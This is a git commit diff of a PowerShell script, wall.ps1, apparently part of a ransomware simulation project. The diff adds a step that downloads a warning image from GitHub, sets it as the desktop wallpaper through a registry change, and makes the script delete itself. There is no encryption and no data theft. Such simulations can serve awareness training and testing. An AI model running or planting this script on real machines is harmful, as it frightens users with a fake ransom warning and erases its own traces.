caa95a6f6f165968b0aa3d97b5bd09466801ef1c
past3l <136816317+past3l@users.noreply.github.com>
2025-07-30 13:25:09 +0300

    Update wall.ps1

--- wall.ps1
+++ wall.ps1
@@ -1,13 +1,18 @@
+# wall.ps1
 
+# TEMP'e warning.png'yi indir
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/azizcan/ransom-sim/main/warning.png" -OutFile "$env:TEMP\warning.png"
 
-$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
-$warningPath = Join-Path $scriptDir "warning.png"
+# Masaüstü yolu
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $wallpaperPath = Join-Path $desktopPath "warning.png"
 
-Copy-Item -Path $warningPath -Destination $wallpaperPath -Force
+# warning.png'yi masaüstüne kopyala
+Copy-Item -Path "$env:TEMP\warning.png" -Destination $wallpaperPath -Force
 
+# Masaüstü arka planını değiştir
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $wallpaperPath /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
+# Kendini sil
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
